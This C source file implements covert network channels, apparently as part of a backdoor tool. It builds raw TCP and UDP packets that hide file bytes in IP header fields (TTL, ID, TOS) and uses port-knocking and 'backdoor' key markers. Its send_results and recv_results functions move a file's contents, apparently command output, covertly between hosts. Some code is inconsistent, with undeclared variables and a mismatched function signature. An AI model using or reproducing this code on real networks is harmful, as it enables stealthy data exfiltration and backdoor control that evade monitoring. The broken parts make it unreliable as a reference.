/*
 * =====================================================================================
 *
 *       Filename:  covert_wrappers.c
 *
 *    Description:
 *
 *        Version:  1.0
 *        Created:  05/29/2018 11:59:52 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (),
 *   Organization:
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include "covert_wrappers.h"

void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
    FILE* file;
    char input;

    printf("listening for results\n\n");

    if((file = fopen(filename, "wb")) == NULL) {
        perror("fopen can't open file");
        exit(1);
    }

    while(1) {
        if(tcp){
            input = covert_recv(sip, sport, 1, 0, 0, 0);
        } else {
            input = covert_udp_recv(sip, sport, true, false, false);
        }
        if(input > 0) {
            printf("Output(%d): %c\n", input, input);
            fprintf(file, "%c", input);
            fflush(file);
        } else if (input == -1){
            printf("Covert Receive Complete\n");
            fclose(file);
            return;
        }
    }
    fclose(file);
}

void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename, bool tcp) {
    FILE *file;
    char input;
    clock_t start;
    int timer_complete =0, delay  = 0;
    int max_delay = 1;
    double passed;

    if((file = fopen(filename, "rb")) == NULL) {
        perror("fopen can't open file");
        exit(1);
    }

    while((input = fgetc(file)) != EOF) {
        if(tcp){
            covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
        } else {
            covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 1);
        }

        /*
           start = clock();    //start of clock
           timer_complete = 0;    //reset the timer again
           delay = rand_delay(max_delay);
           */
        //wait for the timer to complete
        while(timer_complete == 0) {
            //            passed = (clock() - start) / CLOCKS_PER_SEC;
            //            if(passed >= delay) {
            timer_complete = 1;
            //            }
        }
    }

    input = 4;  //send EOT (end of transmission) character
    if(tcp){
        covert_send(sip, dip, sport, dport, (unsigned char*) &input, 1); //send the packet
    } else {
        covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 3);
    }

    fclose(file);
}


int rand_delay(int delay) {
    return rand() % delay + 1;
}

void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
    unsigned char *buf = 0;
    if(covert_channel == 1){
        covert_udp_send(sip,dip,sport,dport,(unsigned char*) buf,4);
        sleep(1);
    }

    for(int i = 0; i<= (int)strlen(data); i++){
        covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i],1);
    }
    //end of file
    covert_udp_send(sip,dip,sport,dport,buf, 3);

}
void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel){
    char datagram[4096] , source_ip[32] , *pseudoheader;
    int sending_socket;
    struct sockaddr_in sin;
    struct upseudo_header pseudo_header;
    memset (datagram, 0, 4096);

    if((sending_socket= socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
        perror("Failed to create raw socket");
        exit(1);
    }

    struct iphdr *ip_header = (struct iphdr *) datagram;
    struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof (struct iphdr));

    sleep(1);

    strcpy(source_ip , sip);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr (dip);

    if(covert_channel == 0) {
        ip_header->ttl = data[0];
        ip_header->id = 'b';
        printf("sending: %c\n", data[0]);
        ip_header->tos = 'l';
    }else if(covert_channel == 1) {
        ip_header->ttl = data[0];
        ip_header->id = 'b';
        printf("sending: %c\n", data[0]);
        ip_header->tos = 'l';
    }else if(covert_channel == 2){
        //key for port knocking
        ip_header->ttl = 0;
        ip_header->id = 'l';  //enter a single ASCII character into the field
        ip_header->tos = 'b';
    }else if(covert_channel == 3){
        //close the connection
        ip_header->ttl = 'x';
        ip_header->id = 'x';  //enter a single ASCII character into the field
        ip_header->tos = 'x';
    }else if(covert_channel == 4){
        ip_header->ttl = 'r';
        ip_header->id = 'r';  //enter a single ASCII character into the field
        ip_header->tos = 'r';
    }

    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr);
    ip_header->frag_off = 0;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr (source_ip);
    ip_header->daddr = sin.sin_addr.s_addr;
    ip_header->check = csum ((unsigned short *) datagram, ip_header->tot_len);

    udp_header->source = htons (sport);
    udp_header->dest = htons (dport);
    udp_header->len = htons(8);
    udp_header->check = 0;

    pseudo_header.source_address = inet_addr( source_ip );
    pseudo_header.dest_address = sin.sin_addr.s_addr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_UDP;
    pseudo_header.udp_length = htons(sizeof(struct udphdr));

    int pseudoheader_size = sizeof(struct upseudo_header) + sizeof(struct udphdr);
    pseudoheader = malloc(pseudoheader_size);

    memcpy(pseudoheader , (char*) &pseudo_header , sizeof (struct upseudo_header));
    memcpy(pseudoheader + sizeof(struct upseudo_header) , udp_header , sizeof(struct udphdr));

    udp_header->check = csum( (unsigned short*) pseudoheader , pseudoheader_size);

    if (sendto (sending_socket, datagram, ip_header->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
        perror("sendto failed");
    }
}

unsigned short csum(unsigned short *ptr,int nbytes){
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}


void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel) {
    int bytes_sent;
    int sending_socket;
    struct sockaddr_in sin;
    unsigned int sip_binary, dip_binary;
    struct send_tcp packet;
    struct timespec delay, resume_delay;

    sip_binary = host_convert(sip);
    dip_binary = host_convert(dip);

    //suspend so sends can keep up with loop
    delay.tv_sec = 0;
    delay.tv_nsec = 500000000L; //delay 1 sec
    if(nanosleep(&delay, &resume_delay) < 0) {
        perror("covert_send: nanosleep");
        return;
    }

    //sleep(1);

    //create IP header
    packet.ip.ihl = 5;
    packet.ip.version = 4;
    //packet.ip.tos = 0;        //lets mess with this
    packet.ip.tot_len = htons(40);


    if(covert_channel == 1) {
        //regular tcp covert channel
        packet.ip.id = data[0];
        printf("sending: %c\n", data[0]);
        packet.ip.tos = 0;
    }else if(covert_channel == 2){
        //key for port knocking
        packet.ip.id = 'l';  //enter a single ASCII character into the field
        packet.ip.tos = 'b';
    }else {
        //key for backdoor
        packet.ip.id = 'b';  //enter a single ASCII character into the field
        packet.ip.tos = 'l';
    }

    packet.ip.frag_off = 0;
    packet.ip.ttl = 64;
    packet.ip.protocol = IPPROTO_TCP;
    packet.ip.check = 0;
    packet.ip.saddr = sip_binary;
    packet.ip.daddr = dip_binary;

    //create TCP header
    //check if source port was set
    if(sport == 0) {
        packet.tcp.source = generate_rand(10000.0);
    } else {
        packet.tcp.source = htons(sport);
    }

    //check if we are forging SEQ
    packet.tcp.seq = generate_rand(10000.0);

    packet.tcp.dest = htons(dport);
    packet.tcp.ack_seq = 0;
    packet.tcp.res1 = 0;
    packet.tcp.doff = 5;
    packet.tcp.fin = 0;
    packet.tcp.syn = 1;
    packet.tcp.rst = 0;
    packet.tcp.psh = 0;
    packet.tcp.ack = 0;
    packet.tcp.urg = 0;
    packet.tcp.res2 = 0;
    packet.tcp.window = htons(512);
    packet.tcp.check = 0;
    packet.tcp.urg_ptr = 0;

    memset(packet.buffer, 0, sizeof(packet.buffer));
    encryptMessage(data, BUFSIZE + 1, (unsigned char*) KEY, (unsigned char*) IV, packet.buffer);
    //    printf("Ciphertext(%lu): %s\n", sizeof(packet.buffer), packet.buffer);

    //creat socket struct
    sin.sin_family = AF_INET;
    sin.sin_port = packet.tcp.source;
    sin.sin_addr.s_addr = packet.ip.daddr;

    //open socket for sending
    sending_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(sending_socket < 0) {
        perror("sending socket failed to open (root maybe required)");
        exit(1);
    }

    //create an IP checksum value
    packet.ip.check = checksum((unsigned short *) &send_tcp.ip, 20);

    pseudo_header.source_address = packet.ip.saddr;
    pseudo_header.dest_address = packet.ip.daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(20);

    //copy packet's tcp into pseudo header tcp
    bcopy((char *) &packet.tcp, (char *) &pseudo_header.tcp, 20);

    //create a TCP checksum value
    packet.tcp.check = checksum((unsigned short *) &pseudo_header, 32);

    //send the packet
    if((bytes_sent = sendto(sending_socket, &packet, sizeof(packet), 0, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
        //if((bytes_sent = send(sending_socket, &packet, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
        perror("sendto");
    }
    }
    char covert_udp_recv(char *sip, int sport, bool ttl, bool tos, bool ipid) {
        struct sockaddr_in sin;
        int recv_socket, n, bytes_recv;
        unsigned int sip_binary;
        char datagram[4096];
        socklen_t socklen;
        sip_binary = host_convert(sip);

        memset(datagram, 0, sizeof(datagram));

        sin.sin_family = AF_INET;
        sin.sin_port = htons(sport);
        sin.sin_addr.s_addr = inet_addr(sip);
        socklen = (socklen_t) sizeof(sin);

        if((n = recv_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
            perror("receiving socket failed to open (root maybe required)");
        }

        if(bind(recv_socket, (struct sockaddr*) &sin, socklen) == -1){
            perror("bind");
            exit(1);
        }

        if((bytes_recv = recv(recv_socket, datagram, sizeof(datagram), 0)) == -1){
            perror("recv");
            exit(1);
        }

        close(recv_socket);
        struct iphdr *ip_header = (struct iphdr *) datagram;
        struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof(struct iphdr));
        if(ip_header->ttl == 'x' && ip_header->tos == 'x' && ip_header->id == 'x' && ntohs(udp_header->dest) == sport){
            return -1;
        } else if(ip_header->tos == 'l' && ip_header->id == 'b' && ntohs(udp_header->dest) == sport) {
            return ip_header->ttl;
        }
        /*
           if(ttl){
           printf("Receiving Data: %d", ip_header->ttl);
           return ip_header->ttl;
           } else if(tos){
           printf("Receiving Data: %d", ip_header->tos);
           return ip_header->tos;
           } else if(ipid){
           printf("Receiving Data: %d", ip_header->id);
           return ip_header->id;
           }*/
    }

    char covert_recv(char *sip, unsigned short sport, int ipid, int seq, int ack, int tos) {
        int recv_socket, n, bytes_recv;
        unsigned int sip_binary;
        //struct recv_tcp recv_packet;
        sip_binary = host_convert(sip);

        if((n = recv_socket = socket(AF_INET, SOCK_RAW, 6)) < 0) {
            perror("receiving socket failed to open (root maybe required)");
        }

        bytes_recv = read(recv_socket, (struct recv_tcp *)&recv_tcp, 9999);

        //check if we received an EOT (end of transmission) char or normal char
        if(recv_tcp.ip.id == 4) {
            return -1;
        } else if(recv_tcp.tcp.source == sport){
            return recv_tcp.ip.id;
        }

        if(sport == 0) {    //from any port
            if((recv_tcp.tcp.syn == 1) && (recv_tcp.ip.saddr == sip_binary)) {
                if(ipid == 1) {
                    printf("Receiving Data(%d): %c\n", bytes_recv, recv_tcp.ip.id);
                    //fprintf(output, "%c", recv_tcp.ip.id);
                    //fflush(output);
                    return recv_tcp.ip.id;
                } else if(tos == 1) {
                    printf("Receiving Data(%d): %c\n", bytes_recv, recv_tcp.ip.tos);
                    return recv_tcp.ip.tos;
                } else if(seq == 1) {
                    printf("Receiving Data(%d): %c\n", bytes_recv, recv_tcp.tcp.seq);
                    //fprintf(output, "%c", recv_tcp.tcp.seq);
                    //fflush(output);
                    return recv_tcp.tcp.seq;

                    //Bounced packets
                    //client must send packet with server's source IP to another host.
                    //flags: --client --sip <the server> --ack?
                } else if(ack == 1) {
                    printf("Receiving Data: %c\n", recv_tcp.tcp.ack_seq);
                    //fprintf(output, "%c", recv_tcp.tcp.ack_seq);
                    //fflush(output);
                    return recv_tcp.tcp.ack_seq;
                }
            }

            //doesn't check source IP in case we're bouncing off hosts
        } else {
            if((recv_tcp.tcp.syn == 1) && (ntohs(recv_tcp.tcp.dest) == sport)) {
                if(ipid == 1) {
                    //printf("Receiving Data(%d): %c\n", bytes_recv, recv_tcp.ip.id);
                    //fprintf(output, "%c", recv_tcp.ip.id);
                    //fflush(output);
                    return recv_tcp.ip.id;
                } else if(tos ==1) {
                    return recv_tcp.ip.tos;
                } else if(seq == 1) {
                    //printf("Receiving Data(%d): %c\n", bytes_recv, recv_tcp.tcp.seq);
                    //fprintf(output, "%c", recv_tcp.tcp.seq);
                    //fflush(output);
                    return recv_tcp.tcp.seq;

                    //Bounced packets
                    //client must send packet with server's source IP to another host.
                    //flags: --client --sip <the server> --ack?
                } else if(ack == 1) {
                    //printf("Receiving Data: %c\n", recv_tcp.tcp.ack_seq);
                    //fprintf(output, "%c", recv_tcp.tcp.ack_seq);
                    //fflush(output);
                    return recv_tcp.tcp.ack_seq;
                }
            }
        }

        close(recv_socket);
        return 0;
    }

    int generate_rand() {
        return 1 + (int)(10000.0 * rand() / RAND_MAX + 1.0);
    }

    unsigned int host_convert(char* hostname) {
        struct in_addr i;
        struct hostent *h;

        i.s_addr = inet_addr(hostname);

        if(i.s_addr == 1) {
            h = gethostbyname(hostname);

            if(h == NULL) {
                fprintf(stderr, "cannot resolve %s\n", hostname);
                exit(0);
            }

            //bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }

        return i.s_addr;
    }

    /* Copyright (c)1987 Regents of the University of California.
     * All rights reserved.
     *
     * Redistribution and use in source and binary forms are permitted
     * provided that the above copyright notice and this paragraph are
     * dupliated in all such forms and that any documentation, advertising
     * materials, and other materials related to such distribution and use
     * acknowledge that the software was developed by the University of
     * California, Berkeley. The name of the University may not be used
     * to endorse or promote products derived from this software without
     * specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
     * IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
     * WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND
     * FITNESS FOR A PARTICULAR PURPOSE
     */

    unsigned short checksum(unsigned short *ptr, int nbytes)
    {
        register long		sum;		/* assumes long == 32 bits */
        u_short			oddbyte;
        register u_short	answer;		/* assumes u_short == 16 bits */

        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */

        sum = 0;
        while (nbytes > 1)  {
            sum += *ptr++;
            nbytes -= 2;
        }

        /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
            oddbyte = 0;		/* make sure top half is zero */
            *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
            sum += oddbyte;
        }

        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */

        sum  = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
        sum += (sum >> 16);			/* add carry */
        answer = ~sum;		/* ones-complement, then truncate to 16 bits */
        return(answer);
    } /* end in_cksm() */
